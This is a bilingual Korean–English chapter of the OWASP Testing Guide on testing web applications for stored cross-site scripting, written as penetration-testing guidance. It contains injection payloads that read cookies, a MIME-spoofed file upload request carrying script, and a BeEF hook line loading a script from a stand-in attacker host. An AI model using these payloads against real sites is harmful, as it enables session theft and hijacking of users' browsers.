============================================================================================
OTG-INPVAL-002 (저장형 크로스 사이트 스크립팅 침투 테스트)
============================================================================================

|

개요
============================================================================================ 

저장형 크로스 사이트 스크립팅은 XSS 중 가장 위협적인 형태입니다.

Web applications that allow users to store data are potentially exposed to this type of attack. This chapter illustrates examples of stored cross site scripting injection and related exploitation scenarios. 
Stored XSS occurs when a web application gathers input from a user which might be malicious, and then stores that input in a data store for later use. The input that is stored is not correctly filtered. As a consequence, the malicious data will appear to be part of the web site and run within the user's browser under the privileges of the web application. Since this vulnerability typically involves at least two requests to the application, this may also called second-order XSS. 
This vulnerability can be used to conduct a number of browser-based attacks including: 

- 다른 사용자 브라우저 하이재킹
- 어플리케이션 사용자에 의해 보이는 민감한 정보 캡쳐
- Pseudo defacement of the application 
- Port scanning of internal hosts ("internal" in relation to the users of the web application) 
- Directed delivery of browser-based exploits 
- Other malicious activities 

저장형 XSS는 공격할 수 있는 악성 링크는 필요 없습니다.
성공적인 공격은 사용자가 저장형 XSS 페이지에 접근할 때 발생합니다.
다음 과정은 일반적인 저장형 XSS 공격 시나리오 입니다.

- 공격자는 취한한 페이지로 악성 코드 저장
- 사용자가 어플리케이션에 인증
- 사용자가 취약한 페이지 방문
- 악성코드가 사용자 브라우저에 의해 실행됨

이러한 공격 형태는 BeEF, XSS Proxy, Backframe 과 같은 브라우저 공격 프레임워크로 공격할 수 있습니다.
이 프레임워크는 복잡한 자바스크립트 공격 개발 입니다.

저장형 XSS는 특히 높은 권한을 가진 사용자가 접근할 때 특히 위협적입니다.
관리자가 취약한 페이지에 접근했을 때, 공격은 브라우저에 의해 자동으로 실행됩니다.
이것은 세션 인증 토큰과 같은 민감한 정보를 노출할 수 있습니다.

|

테스트 방법
============================================================================================

|

Black Box testing
-----------------------------------------------------------------------------------------

저장형 XSS 취약점을 확인하는 과정은 반사형 XSS 취약점 테스트 과정과 유사합니다.

**Input Forms**

The first step is to identify all points where user input is stored into the back-end and then displayed by the application. 

사용자 입력이 저장되는 것을 찾을 수 있는 일반적인 예제

- 사용자/프로파일 페이지: the application allows the user to edit/ change profile details such as first name, last name, nickname, avatar, picture, address, etc. 
- 쇼핑 카트: the application allows the user to store items into the shopping cart which can then be reviewed later 
- 관일 관리: application that allows upload of files 
- 어플리케이션 설정/환경 설정: application that allows the user to set preferences 
- 포럼/메시지 보드: application that permits exchange of posts among users 
- 블로그: if the blog application permits to users submitting comments 
- 로그: if the application stores some users input into logs. 


HTML 코드 분석
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 

Input stored by the application is normally used in HTML tags, but it can also be found as part of JavaScript content. At this stage, it is fundamental to understand if input is stored and how it is positioned in the context of the page. Differently from reflected XSS, the pen-tester should also investigate any out-of-band channels through which the application receives and stores users input. 

Note: All areas of the application accessible by administrators should be tested to identify the presence of any data submitted by users. 

|

**예제** 이메일은 index2.php에 저장된 데이터

[그림]

이메일 값이 위치한 index2.php HTML 코드

.. code-block:: html

    <input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com" /> 

이 경우 테스터는 아래와 같이 <input> 태그로 삽입된 코드를 찾아야 합니다.

.. code-block:: html

    <input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com"> MALICIOUS CODE <!-- /> 

|

저장형 XSS 테스트
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

입력 검증 테스트 및 어플리케이션의 필터링 제어를 포함합니다.

기본 인젝션 예제

.. code-block:: html

    aaa@aa.com"><script>alert(document.cookie)</script> 

.. code-block:: html

    aaa@aa.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E 

입력이 어플리케이션을 통해 제출되어야 합니다.
일반적으로 클라이언트 측 보안 제어가 WebScarab과 같은 웹 프록시로 HTTP 요청이 구현되거나 수정된 경우 자바 스크립트를 비활성화합니다. 
HTTP GET과 POST 요청으로 같은 인젝션을 테스트해보는 것도 중요합니다.

위의 인젝션 결과는 팝업 윈도우에 쿠키값이 포함되는 것입니다.

**예상 결과** 

[그림]

.. code-block:: html

    <input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com">
    <script>alert(document.cookie)</script> 

입력이 저장되고 XSS 페이로드는 페이지 리로드 시 브라우저에 의해 실행됩니다.
만약 입력이 어플리케이션에 의해 취소된다면, 테스터는 XSS 필터를 통해 어플리케이션을 테스트해야합니다.
예를 들어, 만약 "SCRIPT" 문자열이 공백 또는 NULL 문자로 수정된다면,  
XSS 필터를 해야합니다.
입력 필터를 우회하기 위한 수많은 기술이 존재하므로, 관련 문서를 찾아보기 바랍니다.

|

BeEF로 저장형 XSS 활용
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

저장형 XSS는 BeEF, XSS Proxy, Backframe과 같은 고급 Javascript exploitation frameworks 에 의해 공격할 수 있습니다.

일반적인 BeEF 공격 시나리오

- 공격자의 BeEF와 통신하는 자바스크립트 hook을 삽입
- 어플리케이션 사용자가 저장형 입력이 표시되는 취약한 페이지를 보기를 기다리기
- BeEF 콘솔을 통해 어플리케이션 사용자의 브라우저 제어

The JavaScript hook can be injected by exploiting the XSS vulnerability in the web application. 


**예제** BeEF Injection in index2.php: 

.. code-block:: html

    aaa@aa.com"><script src=http://attackersite/hook.js></script> 

When the user loads the page index2.php, the script hook.js is executed by the browser. 
It is then possible to access cookies, user screen-shot, user clipboard, and launch complex XSS attacks. 

**예상 결과**

[그림]

This attack is particularly effective in vulnerable pages that are viewed by many users with different privileges. 

|

File Upload 
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

If the web application allows file upload, it is important to check if it is possible to upload HTML content. 
For instance, if HTML or TXT files are allowed, XSS payload can be injected in the file uploaded. 
The pen-tester should also verify if the file upload allows setting arbitrary MIME types. 
Consider the following HTTP POST request for file upload: 

.. code-block:: html

    POST /fileupload.aspx HTTP/1.1 
    [...] 

    Content-Disposition: form-data; name="uploadfile1"; 
    filename="C:\Documents and Settings\test\Desktop\test.txt" 
    Content-Type: text/plain 

    test 

This design flaw can be exploited in browser MIME mishandling attacks. 
For instance, innocuous-looking files like JPG and GIF can contain an XSS payload that is executed when they are loaded by the browser. 
This is possible when the MIME type for an image such as image/gif can instead be set to text/html. 
In this case the file will be treated by the client browser as HTML. 


HTTP POST Request forged: 


.. code-block:: html

    Content-Disposition: form-data; name="uploadfile1"; 
    filename="C:\Documents and Settings\test\Desktop\test.gif" 
    Content-Type: text/html 
    
    <script>alert(document.cookie)</script> 

Also consider that Internet Explorer does not handle MIME types in the same way as Mozilla Firefox or other browsers do. 
For instance, Internet Explorer handles TXT files with HTML content as HTML content. 
For further information about MIME handling, refer to the whitepapers section at the bottom of this chapter. 

|

Gray Box testing 
-----------------------------------------------------------------------------------------

Gray Box testing is similar to Black box testing. In gray box testing, the pen-tester has partial knowledge of the application. In this case, information regarding user input, input validation controls, and data storage might be known by the pen-tester. 
Depending on the information available, it is normally recommended that testers check how user input is processed by the application and then stored into the back-end system. The following steps are recommended: 

- Use front-end application and enter input with special/invalid characters 
- Analyze application response(s) 
- Identify presence of input validation controls 
- Access back-end system and check if input is stored and how it is stored 
- Analyze source code and understand how stored input is rendered by the application 

If source code is available (White Box), all variables used in input forms should be analyzed. In particular, programming languages such as PHP, ASP, and JSP make use of predefined variables/functions to store input from HTTP GET and POST requests. 

The following table summarizes some special variables and functions to look at when analyzing source code: 

.. csv-table::

    "PHP","ASP","JSP"
    "$_GET","Request.QueryString","doGet"
    "$_POST","Request.Form","doPost"
    "$_REQUEST","","request.getParameter"
    "$_FILES","Server.CreateObject",""

|

Tools 
============================================================================================

- PHP Charset Encoder(PCE): http://yehg.net/encoding/
- HackVertor: http://www.businessinfo.co.uk/labs/hackvertor/
- WebScarab 
- Burp Proxy
- OWASP Zed Attack Proxy (ZAP)
- XSS Assistant: http://www.greasespot.net/ 
- XSS-Proxy: http://xss-proxy.sourceforge.net/ 
- BeEF -http://www.beefproject.com 

|

References
============================================================================================

OWASP Resources 
--------------------------------------------------------------------------------------------

- XSS Filter Evasion Cheat Sheet 


Books 
--------------------------------------------------------------------------------------------

- Joel Scambray, Mike Shema, Caleb Sima -"Hacking Exposed Web Applications", Second Edition, McGraw-Hill, 2006 - ISBN 0-07-226229-0 
- Dafydd Stuttard, Marcus Pinto - "The Web Application's Handbook - Discovering and Exploiting Security Flaws", 2008, Wiley,ISBN 978-0-470-17077-9 
- Jeremiah Grossman, Robert "RSnake" Hansen, Petko "pdp" D. 
Petkov, Anton Rager, Seth Fogie - "Cross Site Scripting Attacks: XSS Exploits and Defense", 2007, Syngress, ISBN-10: 1-59749154-3 


Whitepapers 
--------------------------------------------------------------------------------------------

- CERT: "CERT Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests": http://www.cert.org/advisories/CA-2000-02.html 
- Gunter Ollmann: "HTML Code Injection and Cross-site Scripting": http://www.technicalinfo.net/papers/CSS.html 
- CGISecurity.com: "The Cross Site Scripting FAQ": http://www.cgisecurity.com/xss-faq.html 

|